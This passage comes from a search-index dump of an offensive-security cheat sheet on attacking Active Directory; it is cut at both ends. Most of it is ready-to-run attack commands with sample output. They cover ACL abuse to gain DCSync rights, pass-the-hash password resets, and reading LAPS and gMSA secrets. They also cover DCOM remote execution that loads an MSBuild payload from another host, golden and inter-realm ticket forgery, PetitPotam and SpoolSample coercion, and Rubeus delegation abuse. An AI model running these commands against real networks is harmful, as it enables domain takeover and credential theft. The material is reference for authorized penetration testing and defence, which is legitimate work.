should hide its own process window and spawn the normal graphical environment.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#writedacl","title":"WriteDACL","text":"<p>To abuse <code>WriteDacl</code> to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : <code>./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'</code></p> <ul> <li> <p>WriteDACL on Domain:</p> <ul> <li>On Windows:    <pre><code># Give DCSync right to the principal identity\nImport-Module .\\PowerView.ps1\n$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\\user1', $SecPassword)\nAdd-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local \n</code></pre></li> <li>On Linux: <pre><code># Give DCSync right to the principal identity\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2\n\n# Remove right after DCSync\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False\n</code></pre></li> </ul> </li> <li> <p>WriteDACL on Group   <pre><code>Add-DomainObjectAcl -TargetIdentity \"INTERESTING_GROUP\" -Rights WriteMembers -PrincipalIdentity User1\nnet group \"INTERESTING_GROUP\" User1 /add /domain\n</code></pre>   Or   ```powershell   bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp</p> </li> </ul> <p># Remove right   bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False     ```</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#writeowner","title":"WriteOwner","text":"<p>An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).</p> <p><pre><code>Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'\n</code></pre> Or <pre><code>bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object\n</code></pre></p> <p>This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#readlapspassword","title":"ReadLAPSPassword","text":"<p>An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the Reading LAPS Password section.</p> <p><pre><code>Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'\n</code></pre> Or for a given computer <pre><code>bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#readgmsapassword","title":"ReadGMSAPassword","text":"<p>An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.</p> <p><pre><code># Save the blob to a variable\n$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'\n$mp = $gmsa.'msDS-ManagedPassword'\n# Decode the data structure using the DSInternals module\nConvertFrom-ADManagedPasswordBlob $mp\n</code></pre> Or <pre><code>python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#forcechangepassword","title":"ForceChangePassword","text":"<p>An attacker can change the password of the user this ACE applies to: * On Windows, this can be achieved with <code>Set-DomainUserPassword</code> (PowerView module): <pre><code>$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword\n</code></pre></p> <ul> <li>On Linux: <pre><code># Using rpcclient from the  Samba software suite\nrpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" # Using bloodyAD with pass-the-hash\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-exploitation","title":"DCOM Exploitation","text":"<p>DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.</p> <ul> <li>Impacket DCOMExec.py   <pre><code>dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]\ndcomexec.py -share C$ -object MMC20 '&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;'\ndcomexec.py -share C$ -object MMC20 '&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;' 'ipconfig'\npython3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST 'notepad.exe'\n# -object MMC20 specifies that we wish to instantiate the MMC20.Application object.\n# -silentcommand executes the command without attempting to retrieve the output.\n</code></pre></li> <li>CheeseTools - https://github.com/klezVirus/CheeseTools   <pre><code># https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/\n-t, --target=VALUE         Target Machine\n-b, --binary=VALUE         Binary: powershell.exe\n-a, --args=VALUE           Arguments: -enc &lt;blah&gt;\n-m, --method=VALUE         Methods: MMC20Application, ShellWindows,\nShellBrowserWindow, ExcelDDE, VisioAddonEx,\nOutlookShellEx, ExcelXLL, VisioExecLine, \nOfficeMacro\n-r, --reg, --registry      Enable registry manipulation\n-h, -?, --help             Show Help\nCurrent Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.\n</code></pre></li> <li>Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1   <pre><code>Import-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart \"MyService\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command \"calc.exe\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-mmc-application-class","title":"DCOM via MMC Application Class","text":"<p>This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named \"ExecuteShellCommand\" under Document.ActiveView.</p> <pre><code>PS C:\\&gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\"))\nPS C:\\&gt; $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\calc.exe\",$null,$null,7)\nPS C:\\&gt; $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\",$null,\"-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; \",\"7\")\n# Weaponized example with MSBuild\nPS C:\\&gt; [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\",$null,\"\\\\10.10.10.2\\webdav\\build.xml\",\"7\")\n</code></pre> <p>Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-office","title":"DCOM via Office","text":"<ul> <li>Excel.Application</li> <li>DDEInitiate</li> <li>RegisterXLL</li> <li>Outlook.Application</li> <li>CreateObject-&gt;Shell.Application-&gt;ShellExecute</li> <li>CreateObject-&gt;ScriptControl (office-32bit only)</li> <li>Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)</li> <li>Addons</li> <li>ExecuteLine</li> <li>Word.Application</li> <li>RunAutoMacro</li> </ul> <pre><code># Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM\nInvoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9\nInvoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a\n# Using Excel DDE\nPS C:\\&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))\nPS C:\\&gt; $excel.DisplayAlerts = $false\nPS C:\\&gt; $excel.DDEInitiate(\"cmd\", \"/c calc.exe\")\n# Using Excel RegisterXLL\n# Can't be used reliably with a remote target\nRequire: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1\nPS&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))\nPS&gt; $excel.RegisterXLL(\"EvilXLL.dll\")\n# Using Visio\n$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\"))\n$visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-shellexecute","title":"DCOM via ShellExecute","text":"<pre><code>$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"10.10.10.1\")\n$obj = [System.Activator]::CreateInstance($com)\n$item = $obj.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-shellbrowserwindow","title":"DCOM via ShellBrowserWindow","text":"<p> Windows 10 only, the object doesn't exists in Windows 7</p> <pre><code>$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',\"10.10.10.1\")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#trust-relationship-between-domains","title":"Trust relationship between domains","text":"<ul> <li>One-way</li> <li>Domain B trusts A</li> <li>Users in Domain A can access resources in Domain B</li> <li>Users in Domain B cannot access resources in Domain A</li> <li>Two-way</li> <li>Domain A trusts Domain B</li> <li>Domain B trusts Domain A</li> <li>Authentication requests can be passed between the two domains in both directions</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#enumerate-trusts-between-domains","title":"Enumerate trusts between domains","text":"<pre><code>nltest /trusted_domains\n</code></pre> <p>or</p> <pre><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\nSourceName          TargetName                    TrustType      TrustDirection\n----------          ----------                    ---------      --------------\ndomainA.local      domainB.local                  TreeRoot       Bidirectional\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#exploit-trusts-between-domains","title":"Exploit trusts between domains","text":"<p> Require a Domain-Admin level access to the current domain.</p> Source Target Technique to use Trust relationship Root Child Golden Ticket + Enterprise Admin group (Mimikatz /groups) Inter Realm (2-way) Child Child SID History exploitation (Mimikatz /sids) Inter Realm Parent-Child (2-way) Child Root SID History exploitation (Mimikatz /sids) Inter Realm Tree-Root (2-way) Forest A Forest B PrinterBug + Unconstrained delegation ? Inter Realm Forest or External (2-way)"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#child-domain-to-forest-compromise-sid-hijacking","title":"Child Domain to Forest Compromise - SID Hijacking","text":"<p>Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root.</p> <p>Requirements:  - KRBTGT Hash - Find the SID of the domain     <pre><code>$ Convert-NameToSid target.domain.com\\krbtgt\nS-1-5-21-2941561648-383941485-1389968811-502\n# with Impacket\nlookupsid.py domain/user:password@10.10.10.10\n</code></pre> - Replace 502 with 519 to represent Enterprise Admins - Create golden ticket and attack parent domain.      <pre><code>kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#forest-to-forest-compromise-trust-ticket","title":"Forest to Forest Compromise - Trust Ticket","text":"<ul> <li>Require: SID filtering disabled</li> </ul> <p>From the DC, dump the hash of the <code>currentdomain\\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using  Mimikatz, adding the SID for the target domain's enterprise admins group to our SID history.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dumping-trust-passwords-trust-keys","title":"Dumping trust passwords (trust keys)","text":"<p>Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing $ are computer accounts, but some are trust accounts.</p> <pre><code>lsadump::trust /patch\nor find the TRUST_NAME$ machine account hash\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz","title":"Create a forged trust ticket (inter-realm TGT) using Mimikatz","text":"<pre><code>mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi\nmimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#use-the-trust-ticket-file-to-get-a-st-for-the-targeted-service","title":"Use the Trust Ticket file to get a ST for the targeted service","text":"<pre><code>.\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local\n.\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt\n</code></pre> <p>Inject the ST file and access the targeted service with the spoofed rights.</p> <pre><code>kirbikator lsa .\\ticket.kirbi\nls \\\\machine.domain.local\\c$\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#privileged-access-management-pam-trust","title":"Privileged Access Management (PAM) Trust","text":"<p>PAM (Privileged access managment) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon. Temporary Group Membership also introduced so perms only given for set time. Enumeration</p> <p>Requirements:  * Windows Server 2016 or earlier   </p> <p>If we compromise the bastion we get <code>Domain Admins</code> privileges on the other domain</p> <ul> <li>Default configuration for PAM Trust     <pre><code># execute on our forest\nnetdom trust lab.local /domain:bastion.local /ForestTransitive:Yes \nnetdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes \nnetdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes \nnetdom trust lab.local /domain:bastion.local /Quarantine:No\n# execute on our bastion\nnetdom trust bastion.local /domain:lab.local /ForestTransitive:Yes\n</code></pre></li> <li>Enumerate PAM trusts     <pre><code># Detect if current forest is PAM trust\nImport ADModule\nGet-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}\n# Enumerate shadow security principals \nGet-ADObject -SearchBase (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl\n# Enumerate if current forest is managed by a bastion forest\n# Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External\nGet-ADTrust -Filter {(ForestTransitive -eq $True)} \n</code></pre></li> <li>Compromise<ul> <li>Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)</li> <li>Using SID History</li> </ul> </li> <li>Persistence   <pre><code># Add a compromised user to the group \nSet-ADObject -Identity \"CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local\" -Add @{'member'=\"CN=Administrator,CN=Users,DC=domain,DC=local\"}\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-unconstrained-delegation","title":"Kerberos Unconstrained Delegation","text":"<p>The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html </p> <p>When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. </p> <p> Unconstrained delegation used to be the only option available in Windows 2000</p> <p>Warning Remember to coerce to a HOSTNAME if you want a Kerberos Ticket</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spoolservice-abuse-with-unconstrained-delegation","title":"SpoolService Abuse with Unconstrained Delegation","text":"<p>The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.</p> <p>Requirements: - Object with Property Trust this computer for delegation to any service (Kerberos only) - Must have ADS_UF_TRUSTED_FOR_DELEGATION  - Must not have ADS_UF_NOT_DELEGATED flag - User must not be in the Protected Users group  - User must not have the flag Account is sensitive and cannot be delegated</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#find-delegation","title":"Find delegation","text":"<p> : Domain controllers usually have unconstrained delegation enabled.   Check the <code>TRUSTED_FOR_DELEGATION</code> property.</p> <ul> <li> <p>ADModule <pre><code># From https://github.com/samratashok/ADModule\nPS&gt; Get-ADComputer -Filter {TrustedForDelegation -eq $True}\n</code></pre></p> </li> <li> <p>ldapdomaindump <pre><code>$&gt; ldapdomaindump -u \"DOMAIN\\\\Account\" -p \"Password123*\" 10.10.10.10   \ngrep TRUSTED_FOR_DELEGATION domain_computers.grep\n</code></pre></p> </li> <li> <p>CrackMapExec module <pre><code>cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation\n</code></pre></p> </li> <li> <p>BloodHound: <code>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code></p> </li> <li>Powershell Active Directory module: <code>Get-ADComputer -LDAPFilter \"(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -Properties DNSHostName,userAccountControl</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spoolservice-status","title":"SpoolService status","text":"<p>Check if the spool service is running on the remote host</p> <pre><code>ls \\\\dc01\\pipe\\spoolss\npython rpcdump.py DOMAIN/user:password@10.10.10.10\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#monitor-with-rubeus","title":"Monitor with Rubeus","text":"<p>Monitor incoming connections from Rubeus.</p> <pre><code>Rubeus.exe monitor /interval:1 \n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#force-a-connect-back-from-the-dc","title":"Force a connect back from the DC","text":"<p>Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.</p> <p>SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a \"feature\" in the MS-RPRN RPC interface.</p> <pre><code># From https://github.com/leechristensen/SpoolSample\n.\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME\n.\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB\n# DC01.HACKER.LAB is the domain controller we want to compromise\n# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.\n# From https://github.com/dirkjanm/krbrelayx\nprinterbug.py 'domain/username:password'@&lt;VICTIM-DC-NAME&gt; &lt;UNCONSTRAINED-SERVER-DC-NAME&gt;\n# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689\npython dementor.py -d domain -u username -p password &lt;UNCONSTRAINED-SERVER-DC-NAME&gt; &lt;VICTIM-DC-NAME&gt;\n</code></pre> <p>If the attack worked you should get a TGT of the domain controller.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#load-the-ticket","title":"Load the ticket","text":"<p>Extract the base64 TGT from Rubeus output and load it to our current session.</p> <pre><code>.\\Rubeus.exe asktgs /ticket:&lt;ticket base64&gt; /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt\n</code></pre> <p>Alternatively you could also grab the ticket using Mimikatz :  <code>mimikatz # sekurlsa::tickets</code></p> <p>Then you can use DCsync or another attack : <code>mimikatz # lsadump::dcsync /user:HACKER\\krbtgt</code></p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#mitigation","title":"Mitigation","text":"<ul> <li>Ensure sensitive accounts cannot be delegated</li> <li>Disable the Print Spooler Service</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ms-efsrpc-abuse-with-unconstrained-delegation","title":"MS-EFSRPC Abuse with Unconstrained Delegation","text":"<p>Using <code>PetitPotam</code>, another tool to coerce a callback from the targeted machine, instead of <code>SpoolSample</code>.</p> <pre><code># Coerce the callback\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\n# Extract the ticket\n.\\Rubeus.exe asktgs /ticket:&lt;ticket base64&gt; /ptt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-constrained-delegation","title":"Kerberos Constrained Delegation","text":"<p>Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,</p> <p>Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).</p> <pre><code># Discover\n$ Get-DomainComputer -TrustedToAuth | select -exp dnshostname\n# Find the service \n$ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#exploit-the-constrained-delegation","title":"Exploit the Constrained Delegation","text":"<ul> <li>Impacket   <pre><code>$ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10\n</code></pre></li> <li>Rubeus   <pre><code>$ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...\n$ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt\n$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:\"cifs/dc.domain.com\" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt\n$ dir \\\\dc.domain.com\\c$\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#impersonate-a-domain-user-on-a-resource","title":"Impersonate a domain user on a resource","text":"<p>Require: * SYSTEM level privileges on a machine configured with constrained delegation</p> <pre><code>PS&gt; [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null\nPS&gt; $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')\nPS&gt; $idToImpersonate.Impersonate()\nPS&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name\nPS&gt; ls \\\\dc01.offense.local\\c$\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-resource-based-constrained-delegation","title":"Kerberos Resource Based Constrained Delegation","text":"<p>Resource-based Constrained Delegation was introduced in Windows Server 2012. </p> <p>The user sends a Service Ticket (ST) to access the service (\"Service A\"), and if the service is allowed to delegate to another pre-defined service (\"Service B\"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</p> <ol> <li> <p>Import Powermad and Powerview</p> <pre><code>PowerShell.exe -ExecutionPolicy Bypass\nImport-Module .\\powermad.ps1\nImport-Module .\\powerview.ps1\n</code></pre> </li> <li> <p>Get user SID</p> <pre><code>$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid\n$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}\n$ACE\nConvertFrom-SID $ACE.SecurityIdentifier\n</code></pre> </li> <li> <p>Abuse MachineAccountQuota to create a computer account and set an SPN for it</p> <pre><code>New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)\n</code></pre> </li> <li> <p>Rewrite DC's AllowedToActOnBehalfOfOtherIdentity properties</p> <pre><code>$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nGet-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity\n$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0\n$Descriptor.DiscretionaryAcl\n</code></pre> <pre><code># alternative\n$SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n# alternative\nStandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND\n</code></pre> </li> <li> <p>Use Rubeus to get hash from password</p> <pre><code>Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan\n[*] Input password             : Weakest123*\n[*] Input username             : swktest$\n[*] Input domain               : factory.lan\n[*] Salt                       : FACTORY.LANswktest\n[*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD\n[*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498\n[*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347\n[*]       des_cbc_md5          : BA297CFD07E62A5E\n</code></pre> </li> <li> <p>Impersonate domain admin using our newly created machine account</p> <pre><code>.\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n.\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'\n[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)\n[*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':\ndoIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD\nAgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE\nLmZhY3RvcnkubGFu\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n</code></pre> </li> 